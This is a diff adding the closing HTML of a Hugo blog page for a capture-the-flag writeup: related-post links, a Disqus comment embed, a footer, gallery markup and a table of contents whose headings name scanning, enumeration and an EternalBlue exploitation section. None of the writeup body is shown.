+                    <img src="/post/Django_PwnTillDawn/django_pwntilldawn.JPG" loading="lazy" data-key="" data-hash="/post/Django_PwnTillDawn/django_pwntilldawn.JPG"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Django PwnTillDawn Writeup</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/hollywood-pwntilldawn-writeup/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/post/Hollywood_PwnTillDawn/hollywood_pwntilldawn.JPG" loading="lazy" data-key="" data-hash="/post/Hollywood_PwnTillDawn/hollywood_pwntilldawn.JPG"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Hollywood PwnTillDawn Writeup</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/elmariachi-pc-pwntilldawn-writeup/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/post/El-Mariachi_PwnTillDawn/elmariachi_pwntilldawn.JPG" loading="lazy" data-key="" data-hash="/post/El-Mariachi_PwnTillDawn/elmariachi_pwntilldawn.JPG"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">ElMariachi-PC PwnTillDawn Writeup</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/redpanda-htb-writeup/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/post/RedPanda_HTB/redpanda_htb.jpg" loading="lazy" data-key="" data-hash="/post/RedPanda_HTB/redpanda_htb.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">RedPanda HTB Writeup</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/photobomb-htb-writeup/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/post/Photobomb_HTB/photobomb_htb.jpg" loading="lazy" data-key="" data-hash="/post/Photobomb_HTB/photobomb_htb.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Photobomb HTB Writeup</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script type="application/javascript">
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2022 Abdallah Adham
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.12.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#target-information">Target Information</a></li>
+    <li><a href="#scanning">Scanning</a>
+      <ol>
+        <li><a href="#nmap-scanning">Nmap Scanning</a></li>
+      </ol>
+    </li>
+    <li><a href="#enumeration">Enumeration</a>
+      <ol>
+        <li><a href="#http-enumeration">HTTP Enumeration</a></li>
+        <li><a href="#smb-enumeration">SMB Enumeration</a></li>
+      </ol>
+    </li>
+    <li><a href="#exploitation">Exploitation</a>
+      <ol>
+        <li><a href="#eternalblue-exploit-metasploit">EternalBlue Exploit (Metasploit)</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
